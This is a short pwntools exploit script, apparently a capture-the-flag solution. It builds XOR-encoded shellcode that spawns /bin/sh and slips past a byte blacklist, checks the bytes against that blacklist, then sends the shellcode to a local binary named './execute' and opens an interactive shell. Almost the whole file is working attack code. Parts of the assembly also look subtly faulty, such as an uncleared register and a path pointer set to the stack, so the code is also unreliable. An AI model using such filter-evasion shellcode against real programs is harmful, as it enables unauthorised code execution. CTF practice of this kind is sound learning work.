from pwn import *

context.clear(arch='amd64', os='linux')
context.log_level = 'debug'

xor_key = 0x45
encoded_binsh = bytes([b ^ xor_key for b in b"/bin/sh\x00"])

shellcode = asm(f"""
    lea rdi, [rip + binsh]
    mov ecx, 8
decode:
    xor byte ptr [rdi], {xor_key}
    inc rdi
    loop decode

    push 0
    pop rax
    push 0
    pop rsi
    push 0
    pop rdx

    mov bl, 0x3c
    dec bl
    add rax, rbx

    lea rdi, [rip + binsh]
    push rax
    push rdi
    mov rdi, rsp
    syscall

binsh:
    .byte {', '.join(hex(b) for b in encoded_binsh)}
""")

# Check blacklist
blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"
bad = [hex(b) for b in shellcode if b in blacklist]
if bad:
    print(f"❌ Blacklisted bytes found: {bad}")
else:
    print("✅ Shellcode clean!")

# Run binary
p = process("./execute")
p.send(shellcode)
p.interactive()
